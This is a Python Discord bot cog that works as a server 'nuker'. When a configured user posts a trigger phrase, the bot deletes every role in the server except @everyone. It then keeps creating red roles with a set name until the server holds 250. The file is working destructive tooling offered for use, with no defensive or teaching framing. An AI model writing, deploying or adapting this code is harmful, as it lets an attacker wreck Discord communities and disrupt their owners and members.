import discord
from discord.ext import commands
import json

config = json.loads(open('config/set.json', 'r', encoding='utf-8').read())


class deleteroles(commands.Cog):
    def __init__(self, client):
        self.client = client

    #Delete roles
    @commands.Cog.listener()
    async def on_message(self,message):
        if message.author.bot:
            return
        if message.author.id == int(config["sizinid"]):
            if config["names"]["patlatmamesajı"] in message.content:
                for role in list(message.guild.roles):
                    if role.name == "@everyone":
                        continue
                    else:
                        try:
                            await role.delete()
                        except discord.Forbidden:                            
                            continue
                        except Exception as e:
                            #print("hata : {}".format(e))
                            continue
                a = +1
                while a == 1:
                    rolename = config["names"]["role_name"]
                    await message.guild.create_role(name=rolename,colour=0xff0000)
                    if len(message.guild.roles) == 250:
                        break

def setup(client):
    client.add_cog(deleteroles(client))